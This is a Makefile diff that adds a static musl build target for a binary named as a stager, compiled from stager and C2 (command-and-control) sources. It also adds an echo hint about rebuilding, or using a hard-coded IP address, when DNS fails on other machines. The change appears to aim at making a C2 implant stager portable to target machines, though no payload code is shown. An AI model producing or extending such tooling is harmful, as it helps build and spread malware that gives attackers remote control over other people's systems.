@@ -113,7 +113,16 @@ stager: $(BUILD_DIR)
 		-o $(STAGER_BIN) \
 		-lssl -lcrypto -lpthread -ldl
 	@echo "[+] Stager built: $(STAGER_BIN) ($$(stat -c%s $(STAGER_BIN)) bytes)"
+	@echo "[!] NOTE: If DNS resolution fails on other machines, rebuild with 'make stager-musl' (requires musl-tools + static openssl) OR use an IP address in config.h"
 	@sha256sum $(STAGER_BIN)
+
+stager-musl: $(BUILD_DIR)
+	musl-gcc $(CFLAGS) -static -s \
+		$(INCLUDES) \
+		$(STAGER_SRC) $(COMMON_SRC) $(C2_SRC) \
+		-o $(STAGER_BIN) \
+		-lssl -lcrypto -lpthread
+	@echo "[+] Stager (musl) built: $(STAGER_BIN)"
 
 # ── Nexus Auditor (shared library) ──────────────────────────────────────────
 
